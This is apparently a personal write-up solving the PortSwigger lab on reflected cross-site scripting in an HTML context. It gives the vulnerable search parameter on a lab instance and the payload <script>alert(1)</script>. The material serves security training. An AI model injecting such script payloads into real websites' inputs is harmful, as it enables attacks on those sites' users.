# Lab: Reflected XSS into HTML context with nothing encoded

# [Lab Link](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) 

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 


# Vulnerable  parameter
```plaintext
https://0a4b00c60486e60c8116345a00d700b9.web-security-academy.net/?search= 
```

# Payload
```js
<script>alert(1)</script>

```

![alt text](https://github.com/Ruhanyat-994/XSS/blob/master/Photos/image-1.png?raw=true)  